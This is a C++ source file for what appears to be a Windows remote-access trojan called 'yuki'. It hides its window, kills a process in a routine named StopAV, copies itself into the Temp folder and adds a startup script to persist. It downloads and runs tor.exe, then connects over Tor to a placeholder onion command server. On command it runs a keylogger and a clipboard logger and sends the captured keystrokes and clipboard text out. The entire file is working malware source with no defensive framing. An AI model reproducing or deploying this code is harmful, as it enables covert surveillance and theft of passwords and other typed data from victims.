#include <cstdio>
#include <chrono>
#include <thread>
#include <string>
#include <cstdlib>
#include <fstream>
#include <unistd.h>
#include <tchar.h>
#include <locale.h>
#include <shlobj.h>
#include <Windows.h>
#include <filesystem>
#include <wininet.h>
#include <fcntl.h>
#include <dirent.h>
#include <tlhelp32.h>

#define MAX                 65536
#define cnc_onion_server    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.onion"

HHOOK hHook;
SOCKET fd;

HANDLE hClip;
char* str;
char buf[4096];

HANDLE             lSnapshot, myproc;
BOOL               rProcessFound;
PROCESSENTRY32     uProcess;

char *strstr(const WCHAR*s1, const char *s2)
{
    const WCHAR *p1 = s1;
    const char  *p2 = s2;

    while (*p1 && *p2) {
        if (*p1 == *p2) {
            p1++;
            p2++;
        }
        else {
            p1 -= p2 - s2 - 1;
            p2 = s2;
        }
    }
    return (*p2 ? NULL : (char *)(p1 - (p2 - s2)));
}

void StopAV(const char *antivirus)
{
    BOOL term;
    lSnapshot       = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    uProcess.dwSize = sizeof(uProcess);
    rProcessFound   = Process32First(lSnapshot, &uProcess);
    while (rProcessFound) {
        if (strstr(uProcess.szExeFile, antivirus) != NULL) {
            myproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, uProcess.th32ProcessID);
            if (myproc != NULL) term = TerminateProcess(myproc, 0);
            if (term) ;
            CloseHandle(myproc);
        }
        rProcessFound = Process32Next(lSnapshot,&uProcess);
    }
    CloseHandle(lSnapshot);
}

void Log(std::string input) {
    const char *buf = input.c_str();
    send(fd, buf, 4096, 0);
}

void clip_log() {
    OpenClipboard(NULL);
    hClip = GetClipboardData(CF_TEXT);
    if (hClip != NULL) {
        str = (char*)GlobalLock(hClip);
        if (strcmp(buf, str) != 0) {
            send(fd, str, 4096, 0);
            strncpy(buf, str, sizeof(buf));
        }
        GlobalUnlock(hClip);
    }
    CloseClipboard();
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            char key[3];
            DWORD vkCode = kbd->vkCode;
            if (vkCode >= 0x30 && vkCode <= 0x39) {
                if (GetAsyncKeyState(VK_SHIFT)) {
                    switch (vkCode) {
                    case 0x30:
                        Log(")");
                        break;
                    case 0x31:
                        Log("!");
                        break;
                    case 0x32:
                        Log("@");
                        break;
                    case 0x33:
                        Log("#");
                        break;
                    case 0x34:
                        Log("$");
                        break;
                    case 0x35:
                        Log("%");
                        break;
                    case 0x36:
                        Log("^");
                        break;
                    case 0x37:
                        Log("&");
                        break;
                    case 0x38:
                        Log("*");
                        break;
                    case 0x39:
                        Log("(");
                        break;
                    }
                }
                else {
                    sprintf_s(key, "%c", vkCode);
                    Log(key);
                }
            }
            else if (vkCode >= 0x41 && vkCode <= 0x5A) {
                if (GetAsyncKeyState(VK_SHIFT) == FALSE)
                    vkCode += 32;
                sprintf_s(key, "%c", vkCode);
                Log(key);
            }
            else {
                switch (vkCode) {
                case VK_OEM_PLUS:
                    GetAsyncKeyState(VK_SHIFT) ? Log("+") : Log("=");
                    break;
                case VK_OEM_COMMA:
                    GetAsyncKeyState(VK_SHIFT) ? Log("<") : Log(",");
                    break;
                case VK_OEM_MINUS:
                    GetAsyncKeyState(VK_SHIFT) ? Log("_") : Log("-");
                    break;
                case VK_OEM_PERIOD:
                    GetAsyncKeyState(VK_SHIFT) ? Log(">") : Log(".");
                    break;
                case VK_OEM_1:
                    GetAsyncKeyState(VK_SHIFT) ? Log(":") : Log(";");
                    break;
                case VK_OEM_2:
                    GetAsyncKeyState(VK_SHIFT) ? Log("?") : Log("/");
                    break;
                case VK_OEM_3:
                    GetAsyncKeyState(VK_SHIFT) ? Log("~") : Log("`");
                    break;
                case VK_OEM_4:
                    GetAsyncKeyState(VK_SHIFT) ? Log("{") : Log("[");
                    break;
                case VK_OEM_5:
                    GetAsyncKeyState(VK_SHIFT) ? Log("|") : Log("\\");
                    break;
                case VK_OEM_6:
                    GetAsyncKeyState(VK_SHIFT) ? Log("}") : Log("]");
                    break;
                case VK_OEM_7:
                    GetAsyncKeyState(VK_SHIFT) ? Log("\"") : Log("'");
                    break;
                case VK_LCONTROL:
                    Log("[LCONTROL]");
                    break;
                case VK_RCONTROL:
                    Log("[RCONTROL]");
                    break;
                case VK_CANCEL:
                    Log("[CANCEL]");
                    break;
                case VK_BACK:
                    Log("[BACKSPACE]");
                    break;
                case VK_TAB:
                    Log("[TAB]");
                    break;
                case VK_CLEAR:
                    Log("[CLEAR]");
                    break;
                case VK_RETURN:
                    Log("[ENTER]\n");
                    break;
                case VK_CONTROL:
                    Log("[CTRL]");
                    break;
                case VK_MENU:
                    Log("[ALT]");
                    break;
                case VK_PAUSE:
                    Log("[PAUSE]");
                    break;
                case VK_CAPITAL:
                    Log("[CAPS LOCK]");
                    break;
                case VK_ESCAPE:
                    Log("[ESC]");
                    break;
                case VK_SPACE:
                    Log("[SPACE]");
                    break;
                case VK_PRIOR:
                    Log("[PAGE UP]");
                    break;
                case VK_NEXT:
                    Log("[PAGE DOWN]");
                    break;
                case VK_END:
                    Log("[END]");
                    break;
                case VK_HOME:
                    Log("[HOME]");
                    break;
                case VK_LEFT:
                    Log("[LEFT ARROW]");
                    break;
                case VK_UP:
                    Log("[UP ARROW]");
                    break;
                case VK_RIGHT:
                    Log("[RIGHT ARROW]");
                    break;
                case VK_DOWN:
                    Log("[DOWN ARROW]");
                    break;
                case VK_INSERT:
                    Log("[INS]");
                    break;
                case VK_DELETE:
                    Log("[DEL]");
                    break;
                case VK_NUMPAD0:
                    Log("[NUMPAD 0]");
                    break;
                case VK_NUMPAD1:
                    Log("[NUMPAD 1]");
                    break;
                case VK_NUMPAD2:
                    Log("[NUMPAD 2]");
                    break;
                case VK_NUMPAD3:
                    Log("[NUMPAD 3");
                    break;
                case VK_NUMPAD4:
                    Log("[NUMPAD 4]");
                    break;
                case VK_NUMPAD5:
                    Log("[NUMPAD 5]");
                    break;
                case VK_NUMPAD6:
                    Log("[NUMPAD 6]");
                    break;
                case VK_NUMPAD7:
                    Log("[NUMPAD 7]");
                    break;
                case VK_NUMPAD8:
                    Log("[NUMPAD 8]");
                    break;
                case VK_NUMPAD9:
                    Log("[NUMPAD 9]");
                    break;
                case VK_MULTIPLY:
                    Log("[*]");
                    break;
                case VK_ADD:
                    Log("[+]");
                    break;
                case VK_SUBTRACT:
                    Log("[-]");
                    break;
                case VK_DECIMAL:
                    Log("[.]");
                    break;
                case VK_DIVIDE:
                    Log("[/]");
                    break;
                case VK_F1:
                    Log("[F1]");
                    break;
                case VK_F2:
                    Log("[F2]");
                    break;
                case VK_F3:
                    Log("[F3]");
                    break;
                case VK_F4:
                    Log("[F4]");
                    break;
                case VK_F5:
                    Log("[F5]");
                    break;
                case VK_F6:
                    Log("[F6]");
                    break;
                case VK_F7:
                    Log("[F7]");
                    break;
                case VK_F8:
                    Log("[F8]");
                    break;
                case VK_F9:
                    Log("[F9]");
                    break;
                case VK_F10:
                    Log("[F10]");
                    break;
                case VK_F11:
                    Log("[F11]");
                    break;
                case VK_F12:
                    Log("[F12]");
                    break;
                case VK_NUMLOCK:
                    Log("[NUM LOCK]");
                    break;
                case VK_SCROLL:
                    Log("[SCROLL LOCK]");
                    break;
                }
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void keylog()
{
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

static void start_tor()
{
    STARTUPINFO si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    CreateProcess(nullptr, (LPSTR)"C:\\Windows\\Temp\\tor.exe", nullptr, nullptr, false, 0, nullptr, nullptr, &si, &pi);
}

int wget(HINTERNET hInet, const TCHAR* url, FILE* fp)
{
	char buf[1024];
    HINTERNET hUrl;

    hUrl = InternetOpenUrl(hInet, url, NULL, 0, 0, 0);
    if (hUrl == NULL) {
        return 1;
    }

    int len;
    int size = 0;
    for (;;){
        InternetReadFile(hUrl, buf, sizeof(buf), (LPDWORD)&len);
        if (len <= 0) break;
        fwrite(buf, sizeof(buf[0]), len, fp);
        size += len;
    }
    InternetCloseHandle(hUrl);
    return len;
}

void wget()
{
    HINTERNET hInet;
    HINTERNET hFile;

    FILE *fp;

    hInet = InternetOpen(TEXT("TEST"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

    hFile = InternetOpenUrl(hInet, TEXT("https://github.com/ware255/yuki/raw/main/bot/tor.exe"), NULL, 0, 0, 0);
    if (hFile == NULL) return;

    fopen_s(&fp, "C:\\Windows\\Temp\\tor.exe", "wb");

    if (wget(hInet, TEXT("https://github.com/ware255/yuki/raw/main/bot/tor.exe"), fp) < 0) return;

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInet);
    fclose(fp);
}

TCHAR *my_strcat(TCHAR *dest, const TCHAR *src)
{
    size_t i, j;
    for (j = 0 ; dest[j] != '\0'; j++);
    for (i = 0 ; src[i] != '\0'; i++) dest[j + i] = src[i];
    dest[j + i] = '\0';
    return dest;
}

bool has_suffix(const std::string& s, const std::string& suffix) {
    return (s.size() >= suffix.size()) && equal(suffix.rbegin(), suffix.rend(), s.rbegin());
}

char buff[512];
int source, target, byt;

std::string ExePath() {
    char buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    std::string::size_type pos = std::string(buffer).find_last_of("\\/");
    return std::string(buffer).substr(0, pos);
}

std::string ExeName() {
    char buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

inline void self_duplicating()
{
    std::string exename = ExeName();
    std::string path = ExePath();
    source = open(exename.c_str(), O_RDONLY|O_BINARY);
    target = open("C:\\Windows\\Temp\\yuki.exe", O_CREAT|O_BINARY|O_WRONLY);
    while(1) {
        byt = read(source, buff, 512);
        if (byt > 0) write(target, buff, byt);
        else break;
    }
    close(source);
    close(target);
}

void start_up()
{
    TCHAR path[512];
    TCHAR *s = (TCHAR*)"\\yuki.cmd";
    TCHAR *d = (TCHAR*)"@echo\x20off\nC:\\Windows\\Temp\\yuki.exe 255";
    DWORD dwNumberOfBytesWritten;
    self_duplicating();
f:
    if (SHGetSpecialFolderPath(NULL, path, CSIDL_STARTUP, 0) == TRUE) {
        my_strcat(path, s);
    }
    HANDLE hFile = CreateFile(
        path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
        CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (!WriteFile(hFile, d, lstrlen(d), &dwNumberOfBytesWritten, NULL)) {
        goto f;
    }
    CloseHandle(hFile);
    wget();
}

int main(int argc, char **argv)
{
    HANDLE hMutex = CreateMutex(NULL, FALSE, _T("test"));
    if (GetLastError() == ERROR_ALREADY_EXISTS || hMutex == NULL) return 1;

    //FreeConsole();
    AllocConsole();
    HWND window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);

    if (argc != 2) {
        StopAV("WmiPrvSE.exe");
        start_up();
    }

    std::thread th_a(start_tor);
    th_a.join();
    std::this_thread::sleep_for(std::chrono::seconds(5));

    WSADATA wsaData;
    char recv_buf[MAX] = {};
    char send_buf[MAX] = {};

    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) return 1;

    SOCKET      Socket;
    SOCKADDR_IN SocketAddr;

    SocketAddr.sin_family       = AF_INET;
    SocketAddr.sin_port         = htons(9050);
    SocketAddr.sin_addr.s_addr  = inet_addr("127.0.0.1");

    while (1) {
        Socket = socket(AF_INET, SOCK_STREAM, 0);
        fd = Socket;

        if (connect(Socket, (SOCKADDR*)&SocketAddr, sizeof(SOCKADDR_IN))) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        char Req1[3] = {
            0x05, // SOCKS 5
            0x01, // One Authentication Method
            0x00  // No AUthentication
        };
        send(Socket, Req1, 3, 0);

        char Resp1[2];
        recv(Socket, Resp1, 2, 0);
        if(Resp1[1] != 0x00) {
            continue;
        }

        char Domain[] = cnc_onion_server;
        char  DomainLen = (char)strlen(Domain);
        short Port = htons(80);

        char TmpReq[4] = {
            0x05, // SOCKS5
            0x01, // CONNECT
            0x00, // RESERVED
            0x03, // DOMAIN
        };

        char* Req2 = new char[4 + 1 + DomainLen + 2];

        memcpy(Req2, TmpReq, 4);                // 5, 1, 0, 3
        memcpy(Req2 + 4, &DomainLen, 1);        // Domain Length
        memcpy(Req2 + 5, Domain, DomainLen);    // Domain
        memcpy(Req2 + 5 + DomainLen, &Port, 2); // Port

        send(Socket, (char*)Req2, 4 + 1 + DomainLen + 2, 0);

        delete[] Req2;

        char Resp2[10];
        recv(Socket, Resp2, 10, 0);
        if(Resp2[1] != 0x00) {
            continue;
        }

        std::filesystem::path path = std::filesystem::current_path();
        std::string path_string{path.u8string()};
        char carry[path_string.size()];
        path_string.copy(carry, path_string.size());

        while (1) {
            recv(Socket, recv_buf, sizeof(recv_buf), 0);
            recv_buf[strcspn(recv_buf, "\r\n")] = 0;

            if (!strcmp(recv_buf, "!q")) break;
            if (!strcmp(recv_buf, "pwd")) {
                strcpy(send_buf, carry);
            }
            else if (!strcmp(recv_buf, "keylogger")) {
                keylog();
            }
            else if (!strcmp(recv_buf, "cliplogger")) {
                OpenClipboard(NULL);
                hClip = GetClipboardData(CF_TEXT);
                    if (hClip != NULL) {
                    str = (char*)GlobalLock(hClip);
                    send(Socket, str, strlen(str), 0);
                    GlobalUnlock(hClip);
                }
                strncpy(buf, str, sizeof(buf));
                CloseClipboard();
                while (1) {
                    Sleep(1000);
                    clip_log();
                }
            }
            else if (!strcmp(recv_buf, "all_log")) {
                std::thread th_0(keylog);
                OpenClipboard(NULL);
                hClip = GetClipboardData(CF_TEXT);
                    if (hClip != NULL) {
                    str = (char*)GlobalLock(hClip);
                    send(Socket, str, strlen(str), 0);
                    GlobalUnlock(hClip);
                }
                strncpy(buf, str, sizeof(buf));
                CloseClipboard();
                while (1) {
                    Sleep(1000);
                    clip_log();
                }
                Sleep(-1);
            }
            send(Socket, send_buf, strlen(send_buf), 0);
            memset(send_buf, 0, MAX*sizeof(send_buf[0]));
        }
    }

    closesocket(Socket);

    WSACleanup();

    return 0;
}
